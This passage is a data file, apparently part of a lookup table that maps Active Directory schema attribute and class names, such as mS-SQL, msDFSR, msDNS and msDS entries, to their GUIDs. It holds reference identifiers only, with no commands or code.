        "modifyTimeStamp" = "9a7ad94a-ca53-11d1-bbd0-0080c76670c0";
        "moniker" = "bf9679c7-0de6-11d0-a285-00aa003049e2";
        "monikerDisplayName" = "bf9679c8-0de6-11d0-a285-00aa003049e2";
        "monitorClock" = "a8df7423-c5ea-11d1-bbcb-0080c76670c0";
        "monitoredConfigurations" = "bf9679c9-0de6-11d0-a285-00aa003049e2";
        "monitoredServers" = "a8df7426-c5ea-11d1-bbcb-0080c76670c0";
        "monitoredServices" = "bf9679ca-0de6-11d0-a285-00aa003049e2";
        "monitoringAlertDelay" = "a8df7427-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringAlertUnits" = "a8df7428-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringAvailabilityStyle" = "bf9679cb-0de6-11d0-a285-00aa003049e2";
        "monitoringAvailabilityWindow" = "bf9679cc-0de6-11d0-a285-00aa003049e2";
        "monitoringCachedViaMail" = "bf9679cd-0de6-11d0-a285-00aa003049e2";
        "monitoringCachedViaRPC" = "bf9679ce-0de6-11d0-a285-00aa003049e2";
        "monitoringEscalationProcedure" = "a8df7429-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringHotsitePollInterval" = "a8df742a-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringHotsitePollUnits" = "a8df742b-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringMailUpdateInterval" = "bf9679cf-0de6-11d0-a285-00aa003049e2";
        "monitoringMailUpdateUnits" = "bf9679d0-0de6-11d0-a285-00aa003049e2";
        "monitoringNormalPollInterval" = "a8df742c-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringNormalPollUnits" = "a8df742d-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringRecipients" = "a8df742e-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringRecipientsNDR" = "a8df742f-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringRPCUpdateInterval" = "bf9679d1-0de6-11d0-a285-00aa003049e2";
        "monitoringRPCUpdateUnits" = "bf9679d2-0de6-11d0-a285-00aa003049e2";
        "monitoringWarningDelay" = "a8df7430-c5ea-11d1-bbcb-0080c76670c0";
        "monitoringWarningUnits" = "a8df7431-c5ea-11d1-bbcb-0080c76670c0";
        "monitorServers" = "a8df7424-c5ea-11d1-bbcb-0080c76670c0";
        "monitorServices" = "a8df7425-c5ea-11d1-bbcb-0080c76670c0";
        "moveTreeState" = "1f2ac2c8-3b71-11d2-90cc-00c04fd91ab1";
        "mS-DS-ConsistencyChildCount" = "178b7bc2-b63a-11d2-90e1-00c04fd91ab1";
        "mS-DS-ConsistencyGuid" = "23773dc2-b63a-11d2-90e1-00c04fd91ab1";
        "mS-DS-CreatorSID" = "c5e60132-1480-11d3-91c1-0000f87a57d4";
        "ms-DS-MachineAccountQuota" = "d064fb68-1480-11d3-91c1-0000f87a57d4";
        "mS-DS-ReplicatesNCReason" = "0ea12b84-08b3-11d3-91bc-0000f87a57d4";
        "ms-net-ieee-8023-GP-PolicyData" = "8398948b-7457-4d91-bd4d-8d7ed669c9f7";
        "ms-net-ieee-8023-GP-PolicyGUID" = "94a7b05a-b8b2-4f59-9c25-39e69baa1684";
        "ms-net-ieee-8023-GP-PolicyReserved" = "d3c527c7-2606-4deb-8cfd-18426feec8ce";
        "ms-net-ieee-8023-GroupPolicy" = "99a03a6a-ab19-4446-9350-0cb878ed2d9b";
        "ms-net-ieee-80211-GP-PolicyData" = "9c1495a5-4d76-468e-991e-1433b0a67855";
        "ms-net-ieee-80211-GP-PolicyGUID" = "35697062-1eaf-448b-ac1e-388e0be4fdee";
        "ms-net-ieee-80211-GP-PolicyReserved" = "0f69c62e-088e-4ff5-a53a-e923cec07c0a";
        "ms-net-ieee-80211-GroupPolicy" = "1cb81863-b822-4379-9ea2-5ff7bdc6386d";
        "mS-SQL-Alias" = "e0c6baae-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-AllowAnonymousSubscription" = "db77be4a-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-AllowImmediateUpdatingSubscription" = "c4186b6e-d34b-11d2-999a-0000f87a57d4";
        "mS-SQL-AllowKnownPullSubscription" = "c3bb7054-d34b-11d2-999a-0000f87a57d4";
        "mS-SQL-AllowQueuedUpdatingSubscription" = "c458ca80-d34b-11d2-999a-0000f87a57d4";
        "mS-SQL-AllowSnapshotFilesFTPDownloading" = "c49b8be8-d34b-11d2-999a-0000f87a57d4";
        "mS-SQL-AppleTalk" = "8fda89f4-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Applications" = "fbcda2ea-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Build" = "603e94c4-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-CharacterSet" = "696177a6-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Clustered" = "7778bd90-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-ConnectionURL" = "a92d23da-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Contact" = "4f6cbdd8-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-CreationDate" = "ede14754-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Database" = "d5a0dbdc-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Description" = "8386603c-ccef-11d2-9993-0000f87a57d4";
        "mS-SQL-GPSHeight" = "bcdd4f0e-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-GPSLatitude" = "b222ba0e-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-GPSLongitude" = "b7577c94-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-InformationDirectory" = "d0aedb2e-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-InformationURL" = "a42cd510-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Keywords" = "01e9a98a-ccef-11d2-9993-0000f87a57d4";
        "mS-SQL-Language" = "c57f72f4-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-LastBackupDate" = "f2b6abca-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-LastDiagnosticDate" = "f6d6dd88-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-LastUpdatedDate" = "9fcc43d4-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Location" = "561c9644-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Memory" = "5b5d448c-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-MultiProtocol" = "8157fa38-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Name" = "3532dfd8-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-NamedPipe" = "7b91c840-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-OLAPCube" = "09f0506a-cd28-11d2-9993-0000f87a57d4";
        "mS-SQL-OLAPDatabase" = "20af031a-ccef-11d2-9993-0000f87a57d4";
        "mS-SQL-OLAPServer" = "0c7e18ea-ccef-11d2-9993-0000f87a57d4";
        "mS-SQL-PublicationURL" = "ae0c11b8-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Publisher" = "c1676858-d34b-11d2-999a-0000f87a57d4";
        "mS-SQL-RegisteredOwner" = "48fd44ea-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-ServiceAccount" = "64933a3e-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Size" = "e9098084-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-SortOrder" = "6ddc42c0-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-SPX" = "86b08004-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-SQLDatabase" = "1d08694a-ccef-11d2-9993-0000f87a57d4";
        "mS-SQL-SQLPublication" = "17c2f64e-ccef-11d2-9993-0000f87a57d4";
        "mS-SQL-SQLRepository" = "11d43c5c-ccef-11d2-9993-0000f87a57d4";
        "mS-SQL-SQLServer" = "05f6c878-ccef-11d2-9993-0000f87a57d4";
        "mS-SQL-Status" = "9a7d4770-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-TCPIP" = "8ac263a6-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-ThirdParty" = "c4e311fc-d34b-11d2-999a-0000f87a57d4";
        "mS-SQL-Type" = "ca48eba8-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-UnicodeSortOrder" = "72dc918a-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Version" = "c07cc1d0-ccee-11d2-9993-0000f87a57d4";
        "mS-SQL-Vines" = "94c56394-ccee-11d2-9993-0000f87a57d4";
        "msAuthz-CentralAccessPolicies" = "555c21c3-a136-455a-9397-796bbd358e25";
        "msAuthz-CentralAccessPolicy" = "a5679cb0-6f9d-432c-8b75-1e3e834f02aa";
        "msAuthz-CentralAccessPolicyID" = "62f29b60-be74-4630-9456-2f6691993a86";
        "msAuthz-CentralAccessRule" = "5b4a06dc-251c-4edb-8813-0bdd71327226";
        "msAuthz-CentralAccessRules" = "99bb1b7a-606d-4f8b-800e-e15be554ca8d";
        "msAuthz-EffectiveSecurityPolicy" = "07831919-8f94-4fb6-8a42-91545dccdad3";
        "msAuthz-LastEffectiveSecurityPolicy" = "8e1685c6-3e2f-48a2-a58d-5af0ea789fa0";
        "msAuthz-MemberRulesInCentralAccessPolicy" = "57f22f7a-377e-42c3-9872-cec6f21d2e3e";
        "msAuthz-MemberRulesInCentralAccessPolicyBL" = "516e67cf-fedd-4494-bb3a-bc506a948891";
        "msAuthz-ProposedSecurityPolicy" = "b946bece-09b5-4b6a-b25a-4b63a330e80e";
        "msAuthz-ResourceCondition" = "80997877-f874-4c68-864d-6e508a83bdbd";
        "msCOM-DefaultPartitionLink" = "998b10f7-aa1a-4364-b867-753d197fe670";
        "msCOM-ObjectId" = "430f678b-889f-41f2-9843-203b5a65572f";
        "msCOM-Partition" = "c9010e74-4e58-49f7-8a89-5e3e2340fcf8";
        "msCOM-PartitionLink" = "09abac62-043f-4702-ac2b-6ca15eee5754";
        "msCOM-PartitionSet" = "250464ab-c417-497a-975a-9e0d459a7ca1";
        "msCOM-PartitionSetLink" = "67f121dc-7d02-4c7d-82f5-9ad4c950ac34";
        "msCOM-UserLink" = "9e6f3a4d-242c-4f37-b068-36b57f9fc852";
        "msCOM-UserPartitionSetLink" = "8e940c8a-e477-4367-b08d-ff2ff942dcd7";
        "mscopeId" = "963d2751-48be-11d1-a9c3-0000f80367c1";
        "msDFS-Commentv2" = "b786cec9-61fd-4523-b2c1-5ceb3860bb32";
        "msDFS-DeletedLinkv2" = "25173408-04ca-40e8-865e-3f9ce9bf1bd3";
        "msDFS-GenerationGUIDv2" = "35b8b3d9-c58f-43d6-930e-5040f2f1a781";
        "msDFS-LastModifiedv2" = "3c095e8a-314e-465b-83f5-ab8277bcf29b";
        "msDFS-LinkIdentityGUIDv2" = "edb027f3-5726-4dee-8d4e-dbf07e1ad1f1";
        "msDFS-LinkPathv2" = "86b021f6-10ab-40a2-a252-1dc0cc3be6a9";
        "msDFS-LinkSecurityDescriptorv2" = "57cf87f7-3426-4841-b322-02b3b6e9eba8";
        "msDFS-Linkv2" = "7769fb7a-1159-4e96-9ccd-68bc487073eb";
        "msDFS-NamespaceAnchor" = "da73a085-6e64-4d61-b064-015d04164795";
        "msDFS-NamespaceIdentityGUIDv2" = "200432ce-ec5f-4931-a525-d7f4afe34e68";
        "msDFS-Namespacev2" = "21cb8628-f3c3-4bbf-bff6-060b2d8f299a";
        "msDFS-Propertiesv2" = "0c3e5bc5-eb0e-40f5-9b53-334e958dffdb";
        "msDFS-SchemaMajorVersion" = "ec6d7855-704a-4f61-9aa6-c49a7c1d54c7";
        "msDFS-SchemaMinorVersion" = "fef9a725-e8f1-43ab-bd86-6a0115ce9e38";
        "msDFS-ShortNameLinkPathv2" = "2d7826f0-4cf7-42e9-a039-1110e0d9ca99";
        "msDFS-TargetListv2" = "6ab126c6-fa41-4b36-809e-7ca91610d48f";
        "msDFS-Ttlv2" = "ea944d31-864a-4349-ada5-062e2c614f5e";
        "msDFSR-CachePolicy" = "db7a08e7-fc76-4569-a45f-f5ecb66a88b5";
        "msDFSR-CommonStagingPath" = "936eac41-d257-4bb9-bd55-f310a3cf09ad";
        "msDFSR-CommonStagingSizeInMb" = "135eb00e-4846-458b-8ea2-a37559afd405";
        "msDFSR-ComputerReference" = "6c7b5785-3d21-41bf-8a8a-627941544d5a";
        "msDFSR-ComputerReferenceBL" = "5eb526d7-d71b-44ae-8cc6-95460052e6ac";
        "msDFSR-ConflictPath" = "5cf0bcc8-60f7-4bff-bda6-aea0344eb151";
        "msDFSR-ConflictSizeInMb" = "9ad33fc9-aacf-4299-bb3e-d1fc6ea88e49";
        "msDFSR-Connection" = "e58f972e-64b5-46ef-8d8b-bbc3e1897eab";
        "msDFSR-Content" = "64759b35-d3a1-42e4-b5f1-a3de162109b3";
        "msDFSR-ContentSet" = "4937f40d-a6dc-4d48-97ca-06e5fbfd3f16";
        "msDFSR-ContentSetGuid" = "1035a8e1-67a8-4c21-b7bb-031cdf99d7a0";
        "msDFSR-DefaultCompressionExclusionFilter" = "87811bd5-cd8b-45cb-9f5d-980f3a9e0c97";
        "msDFSR-DeletedPath" = "817cf0b8-db95-4914-b833-5a079ef65764";
        "msDFSR-DeletedSizeInMb" = "53ed9ad1-9975-41f4-83f5-0c061a12553a";
        "msDFSR-DfsLinkTarget" = "f7b85ba9-3bf9-428f-aab4-2eee6d56f063";
        "msDFSR-DfsPath" = "2cc903e2-398c-443b-ac86-ff6b01eac7ba";
        "msDFSR-DirectoryFilter" = "93c7b477-1f2e-4b40-b7bf-007e8d038ccf";
        "msDFSR-DisablePacketPrivacy" = "6a84ede5-741e-43fd-9dd6-aa0f61578621";
        "msDFSR-Enabled" = "03726ae7-8e7d-4446-8aae-a91657c00993";
        "msDFSR-Extension" = "78f011ec-a766-4b19-adcf-7b81ed781a4d";
        "msDFSR-FileFilter" = "d68270ac-a5dc-4841-a6ac-cd68be38c181";
        "msDFSR-Flags" = "fe515695-3f61-45c8-9bfa-19c148c57b09";
        "msDFSR-GlobalSettings" = "7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6";
        "msDFSR-Keywords" = "048b4692-6227-4b67-a074-c4437083e14b";
        "msDFSR-LocalSettings" = "fa85c591-197f-477e-83bd-ea5a43df2239";
        "msDFSR-MaxAgeInCacheInMin" = "2ab0e48d-ac4e-4afc-83e5-a34240db6198";
        "msDFSR-Member" = "4229c897-c211-437c-a5ae-dbf705b696e5";
        "msDFSR-MemberReference" = "261337aa-f1c3-44b2-bbea-c88d49e6f0c7";
        "msDFSR-MemberReferenceBL" = "adde62c6-1880-41ed-bd3c-30b7d25e14f0";
        "msDFSR-MinDurationCacheInMin" = "4c5d607a-ce49-444a-9862-82a95f5d1fcc";
        "msDFSR-OnDemandExclusionDirectoryFilter" = "7d523aff-9012-49b2-9925-f922a0018656";
        "msDFSR-OnDemandExclusionFileFilter" = "a68359dc-a581-4ee6-9015-5382c60f0fb4";
        "msDFSR-Options" = "d6d67084-c720-417d-8647-b696237a114c";
        "msDFSR-Options2" = "11e24318-4ca6-4f49-9afe-e5eb1afa3473";
        "msDFSR-Priority" = "eb20e7d6-32ad-42de-b141-16ad2631b01b";
        "msDFSR-RdcEnabled" = "e3b44e05-f4a7-4078-a730-f48670a743f8";
        "msDFSR-RdcMinFileSizeInKb" = "f402a330-ace5-4dc1-8cc9-74d900bf8ae0";
        "msDFSR-ReadOnly" = "5ac48021-e447-46e7-9d23-92c0c6a90dfb";
        "msDFSR-ReplicationGroup" = "1c332fe0-0c2a-4f32-afca-23c5e45a9e77";
        "msDFSR-ReplicationGroupGuid" = "2dad8796-7619-4ff8-966e-0a5cc67b287f";
        "msDFSR-ReplicationGroupType" = "eeed0fc8-1001-45ed-80cc-bbf744930720";
        "msDFSR-RootFence" = "51928e94-2cd8-4abe-b552-e50412444370";
        "msDFSR-RootPath" = "d7d5e8c1-e61f-464f-9fcf-20bbe0a2ec54";
        "msDFSR-RootSizeInMb" = "90b769ac-4413-43cf-ad7a-867142e740a3";
        "msDFSR-Schedule" = "4699f15f-a71f-48e2-9ff5-5897c0759205";
        "msDFSR-StagingCleanupTriggerInPercent" = "d64b9c23-e1fa-467b-b317-6964d744d633";
        "msDFSR-StagingPath" = "86b9a69e-f0a6-405d-99bb-77d977992c2a";
        "msDFSR-StagingSizeInMb" = "250a8f20-f6fc-4559-ae65-e4b24c67aebe";
        "msDFSR-Subscriber" = "e11505d7-92c4-43e7-bf5c-295832ffc896";
        "msDFSR-Subscription" = "67212414-7bcc-4609-87e0-088dad8abdee";
        "msDFSR-TombstoneExpiryInMin" = "23e35d4c-e324-4861-a22f-e199140dae00";
        "msDFSR-Topology" = "04828aa9-6e42-4e80-b962-e2fe00754d17";
        "msDFSR-Version" = "1a861408-38c3-49ea-ba75-85481a77c655";
        "msDNS-DNSKEYRecords" = "28c458f5-602d-4ac9-a77c-b3f1be503a7e";
        "msDNS-DNSKEYRecordSetTTL" = "8f4e317f-28d7-442c-a6df-1f491f97b326";
        "msDNS-DSRecordAlgorithms" = "5c5b7ad2-20fa-44bb-beb3-34b9c0f65579";
        "msDNS-DSRecordSetTTL" = "29869b7c-64c4-42fe-97d5-fbc2fa124160";
        "msDNS-IsSigned" = "aa12854c-d8fc-4d5e-91ca-368b8d829bee";
        "msDNS-KeymasterZones" = "0be0dd3b-041a-418c-ace9-2f17d23e9d42";
        "msDNS-MaintainTrustAnchor" = "0dc063c1-52d9-4456-9e15-9c2434aafd94";
        "msDNS-NSEC3CurrentSalt" = "387d9432-a6d1-4474-82cd-0a89aae084ae";
        "msDNS-NSEC3HashAlgorithm" = "ff9e5552-7db7-4138-8888-05ce320a0323";
        "msDNS-NSEC3Iterations" = "80b70aab-8959-4ec0-8e93-126e76df3aca";
        "msDNS-NSEC3OptOut" = "7bea2088-8ce2-423c-b191-66ec506b1595";
        "msDNS-NSEC3RandomSaltLength" = "13361665-916c-4de7-a59d-b1ebbd0de129";
        "msDNS-NSEC3UserSalt" = "aff16770-9622-4fbc-a128-3088777605b9";
        "msDNS-ParentHasSecureDelegation" = "285c6964-c11a-499e-96d8-bf7c75a223c6";
        "msDNS-PropagationTime" = "ba340d47-2181-4ca0-a2f6-fae4479dab2a";
        "msDNS-RFC5011KeyRollovers" = "27d93c40-065a-43c0-bdd8-cdf2c7d120aa";
        "msDNS-SecureDelegationPollingPeriod" = "f6b0f0be-a8e4-4468-8fd9-c3c47b8722f9";
        "msDNS-ServerSettings" = "ef2fc3ed-6e18-415b-99e4-3114a8cb124b";
        "msDNS-SignatureInceptionOffset" = "03d4c32e-e217-4a61-9699-7bbc4729a026";
        "msDNS-SigningKeyDescriptors" = "3443d8cd-e5b6-4f3b-b098-659a0214a079";
        "msDNS-SigningKeys" = "b7673e6d-cad9-4e9e-b31a-63e8098fdd63";
        "msDNS-SignWithNSEC3" = "c79f2199-6da1-46ff-923c-1f3f800c721e";
        "msDRM-IdentityCertificate" = "e85e1204-3434-41ad-9b56-e2901228fff0";
        "msDS-AdditionalDnsHostName" = "80863791-dbe9-4eb8-837e-7f0ab55d9ac7";
        "msDS-AdditionalSamAccountName" = "975571df-a4d5-429a-9f59-cdc6581d91e6";
        "msDS-AllowedDNSSuffixes" = "8469441b-9ac4-4e45-8205-bd219dbf672d";
        "msDS-AllowedToActOnBehalfOfOtherIdentity" = "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79";
        "msDS-AllowedToDelegateTo" = "800d94d7-b7a1-42a1-b14d-7cae1423d07f";
        "msDS-AllUsersTrustQuota" = "d3aa4a5c-4e03-4810-97aa-2b339e7a434b";
        "msDS-App-Configuration" = "90df3c3e-1854-4455-a5d7-cad40d56657a";
        "msDS-AppData" = "9e67d761-e327-4d55-bc95-682f875e2f8e";
        "msDS-AppliesToResourceTypes" = "693f2006-5764-3d4a-8439-58f04aab4b59";
        "msDS-Approx-Immed-Subordinates" = "e185d243-f6ce-4adb-b496-b0c005d7823c";
        "msDS-ApproximateLastLogonTimeStamp" = "a34f983b-84c6-4f0c-9050-a3a14a1d35a4";
        "msDS-AssignedAuthNPolicy" = "b87a0ad8-54f7-49c1-84a0-e64d12853588";
        "msDS-AssignedAuthNPolicyBL" = "2d131b3c-d39f-4aee-815e-8db4bc1ce7ac";
        "msDS-AssignedAuthNPolicySilo" = "b23fc141-0df5-4aea-b33d-6cf493077b3f";
        "msDS-AssignedAuthNPolicySiloBL" = "33140514-f57a-47d2-8ec4-04c4666600c7";
        "msDS-AuthenticatedAtDC" = "3e1ee99c-6604-4489-89d9-84798a89515a";
        "msDS-AuthenticatedToAccountlist" = "e8b2c971-a6df-47bc-8d6f-62770d527aa5";
        "msDS-AuthNPolicies" = "3a9adf5d-7b97-4f7e-abb4-e5b55c1c06b4";
        "msDS-AuthNPolicy" = "ab6a1156-4dc7-40f5-9180-8e4ce42fe5cd";
        "msDS-AuthNPolicyEnforced" = "7a560cc2-ec45-44ba-b2d7-21236ad59fd5";
        "msDS-AuthNPolicySilo" = "f9f0461e-697d-4689-9299-37e61d617b0d";
        "msDS-AuthNPolicySiloEnforced" = "f2f51102-6be0-493d-8726-1546cdbc8771";
        "msDS-AuthNPolicySiloMembers" = "164d1e05-48a6-4886-a8e9-77a2006e3c77";
        "msDS-AuthNPolicySiloMembersBL" = "11fccbc7-fbe4-4951-b4b7-addf6f9efd44";
        "msDS-AuthNPolicySilos" = "d2b1470a-8f84-491e-a752-b401ee00fe5c";
        "msDS-Auxiliary-Classes" = "c4af1073-ee50-4be0-b8c0-89a41fe99abe";
        "msDS-AzAdminManager" = "cfee1051-5f28-4bae-a863-5d0cc18a8ed1";
        "msDS-AzApplication" = "ddf8de9b-cba5-4e12-842e-28d8b66f75ec";
        "msDS-AzApplicationData" = "503fc3e8-1cc6-461a-99a3-9eee04f402a7";
        "msDS-AzApplicationName" = "db5b0728-6208-4876-83b7-95d3e5695275";
        "msDS-AzApplicationVersion" = "7184a120-3ac4-47ae-848f-fe0ab20784d4";
        "msDS-AzBizRule" = "33d41ea8-c0c9-4c92-9494-f104878413fd";
        "msDS-AzBizRuleLanguage" = "52994b56-0e6c-4e07-aa5c-ef9d7f5a0e25";
        "msDS-AzClassId" = "013a7277-5c2d-49ef-a7de-b765b36a3f6f";
        "msDS-AzDomainTimeout" = "6448f56a-ca70-4e2e-b0af-d20e4ce653d0";
        "msDS-AzGenerateAudits" = "f90abab0-186c-4418-bb85-88447c87222a";
        "msDS-AzGenericData" = "b5f7e349-7a5b-407c-a334-a31c3f538b98";
        "msDS-AzLastImportedBizRulePath" = "665acb5c-bb92-4dbc-8c59-b3638eab09b3";
        "msDS-AzLDAPQuery" = "5e53368b-fc94-45c8-9d7d-daf31ee7112d";
        "msDS-AzMajorVersion" = "cfb9adb7-c4b7-4059-9568-1ed9db6b7248";
        "msDS-AzMinorVersion" = "ee85ed93-b209-4788-8165-e702f51bfbf3";
        "msDS-AzObjectGuid" = "8491e548-6c38-4365-a732-af041569b02c";
        "msDS-AzOperation" = "860abe37-9a9b-4fa4-b3d2-b8ace5df9ec5";
        "msDS-AzOperationID" = "a5f3b553-5d76-4cbe-ba3f-4312152cab18";
        "msDS-AzRole" = "8213eac9-9d55-44dc-925c-e9a52b927644";
        "msDS-AzScope" = "4feae054-ce55-47bb-860e-5b12063a51de";
        "msDS-AzScopeName" = "515a6b06-2617-4173-8099-d5605df043c6";
        "msDS-AzScriptEngineCacheMax" = "2629f66a-1f95-4bf3-a296-8e9d7b9e30c8";
        "msDS-AzScriptTimeout" = "87d0fb41-2c8b-41f6-b972-11fdfd50d6b0";
        "msDS-AzTask" = "1ed3a473-9b1b-418a-bfa0-3a37b95a5306";
        "msDS-AzTaskIsRoleDefinition" = "7b078544-6c82-4fe9-872f-ff48ad2b2e26";
        "msDS-Behavior-Version" = "d31a8757-2447-4545-8081-3bb610cacbf2";
        "msDS-BridgeHeadServersUsed" = "3ced1465-7b71-2541-8780-1e1ea6243a82";
        "msDS-ByteArray" = "f0d8972e-dd5b-40e5-a51d-044c7c17ece7";
        "msDS-Cached-Membership" = "69cab008-cdd4-4bc9-bab8-0ff37efe1b20";
        "msDS-Cached-Membership-Time-Stamp" = "3566bf1f-beee-4dcb-8abe-ef89fcfec6c1";
        "msDS-ClaimAttributeSource" = "eebc123e-bae6-4166-9e5b-29884a8b76b0";
        "msDS-ClaimIsSingleValued" = "cd789fb9-96b4-4648-8219-ca378161af38";
        "msDS-ClaimIsValueSpaceRestricted" = "0c2ce4c7-f1c3-4482-8578-c60d4bb74422";
        "msDS-ClaimPossibleValues" = "2e28edee-ed7c-453f-afe4-93bd86f2174f";
        "msDS-ClaimSharesPossibleValuesWith" = "52c8d13a-ce0b-4f57-892b-18f5a43a2400";
        "msDS-ClaimSharesPossibleValuesWithBL" = "54d522db-ec95-48f5-9bbd-1880ebbb2180";
        "msDS-ClaimSource" = "fa32f2a6-f28b-47d0-bf91-663e8f910a72";
        "msDS-ClaimSourceType" = "92f19c05-8dfa-4222-bbd1-2c4f01487754";
        "msDS-ClaimsTransformationPolicies" = "c8fca9b1-7d88-bb4f-827a-448927710762";
        "msDS-ClaimsTransformationPolicyType" = "2eeb62b3-1373-fe45-8101-387f1676edc7";
        "msDS-ClaimType" = "81a3857c-5469-4d8f-aae6-c27699762604";
        "msDS-ClaimTypeAppliesToClass" = "6afb0e4c-d876-437c-aeb6-c3e41454c272";
        "msDS-ClaimTypePropertyBase" = "b8442f58-c490-4487-8a9d-d80b883271ad";
        "msDS-ClaimTypes" = "36093235-c715-4821-ab6a-b56fb2805a58";
        "msDS-ClaimValueType" = "c66217b9-e48e-47f7-b7d5-6552b8afd619";
        "msDS-CloudAnchor" = "78565e80-03d4-4fe3-afac-8c3bca2f3653";
        "msDS-cloudExtensionAttribute1" = "9709eaaf-49da-4db2-908a-0446e5eab844";
        "msDS-cloudExtensionAttribute2" = "f34ee0ac-c0c1-4ba9-82c9-1a90752f16a5";
        "msDS-cloudExtensionAttribute3" = "82f6c81a-fada-4a0d-b0f7-706d46838eb5";
        "msDS-cloudExtensionAttribute4" = "9cbf3437-4e6e-485b-b291-22b02554273f";
        "msDS-cloudExtensionAttribute5" = "2915e85b-e347-4852-aabb-22e5a651c864";
        "msDS-cloudExtensionAttribute6" = "60452679-28e1-4bec-ace3-712833361456";
        "msDS-cloudExtensionAttribute7" = "4a7c1319-e34e-40c2-9d00-60ff7890f207";
        "msDS-cloudExtensionAttribute8" = "3cd1c514-8449-44ca-81c0-021781800d2a";
        "msDS-cloudExtensionAttribute9" = "0a63e12c-3040-4441-ae26-cd95af0d247e";
        "msDS-cloudExtensionAttribute10" = "670afcb3-13bd-47fc-90b3-0a527ed81ab7";
        "msDS-cloudExtensionAttribute11" = "9e9ebbc8-7da5-42a6-8925-244e12a56e24";
        "msDS-cloudExtensionAttribute12" = "3c01c43d-e10b-4fca-92b2-4cf615d5b09a";
        "msDS-cloudExtensionAttribute13" = "28be464b-ab90-4b79-a6b0-df437431d036";
        "msDS-cloudExtensionAttribute14" = "cebcb6ba-6e80-4927-8560-98feca086a9f";
        "msDS-cloudExtensionAttribute15" = "aae4d537-8af0-4daa-9cc6-62eadb84ff03";
        "msDS-cloudExtensionAttribute16" = "9581215b-5196-4053-a11e-6ffcafc62c4d";
        "msDS-cloudExtensionAttribute17" = "3d3c6dda-6be8-4229-967e-2ff5bb93b4ce";
        "msDS-cloudExtensionAttribute18" = "88e73b34-0aa6-4469-9842-6eb01b32a5b5";
        "msDS-cloudExtensionAttribute19" = "0975fe99-9607-468a-8e18-c800d3387395";
        "msDS-cloudExtensionAttribute20" = "f5446328-8b6e-498d-95a8-211748d5acdc";
        "msDS-CloudExtensions" = "641e87a4-8326-4771-ba2d-c706df35e35a";
        "msDS-CloudIsEnabled" = "89848328-7c4e-4f6f-a013-28ce3ad282dc";
        "msDS-CloudIsManaged" = "5315ba8e-958f-4b52-bd38-1349a304dd63";
        "msDS-CloudIssuerPublicCertificates" = "a1e8b54f-4bd6-4fd2-98e2-bcee92a55497";
        "msDS-ComputerAllowedToAuthenticateTo" = "105babe9-077e-4793-b974-ef0410b62573";
        "msDS-ComputerAuthNPolicy" = "afb863c9-bea3-440f-a9f3-6153cc668929";
        "msDS-ComputerAuthNPolicyBL" = "2bef6232-30a1-457e-8604-7af6dbf131b8";
        "msDS-ComputerSID" = "dffbd720-0872-402e-9940-fcd78db049ba";
        "msDS-ComputerTGTLifetime" = "2e937524-dfb9-4cac-a436-a5b7da64fd66";
        "msDS-CustomKeyInformation" = "b6e5e988-e5e4-4c86-a2ae-0dacb970a0e1";
        "msDS-DateTime" = "234fcbd8-fb52-4908-a328-fd9f6e58e403";
        "msDS-DefaultQuota" = "6818f726-674b-441b-8a3a-f40596374cea";
        "msDS-DeletedObjectLifetime" = "a9b38cb6-189a-4def-8a70-0fcfa158148e";
        "msDS-Device" = "5df2b673-6d41-4774-b3e8-d52e8ee9ff99";
        "msDS-DeviceContainer" = "7c9e8c58-901b-4ea8-b6ec-4eb9e9fc0e11";
        "msDS-DeviceDN" = "642c1129-3899-4721-8e21-4839e3988ce5";
        "msDS-DeviceID" = "c30181c7-6342-41fb-b279-f7c566cbe0a7";
        "msDS-DeviceLocation" = "e3fb56c8-5de8-45f5-b1b1-d2b6cd31e762";
        "msDS-DeviceMDMStatus" = "f60a8f96-57c4-422c-a3ad-9e2fa09ce6f7";
        "msDS-DeviceObjectVersion" = "ef65695a-f179-4e6a-93de-b01e06681cfb";
        "msDS-DeviceOSType" = "100e454d-f3bb-4dcb-845f-8d5edc471c59";
        "msDS-DeviceOSVersion" = "70fb8c63-5fab-4504-ab9d-14b329a8a7f8";
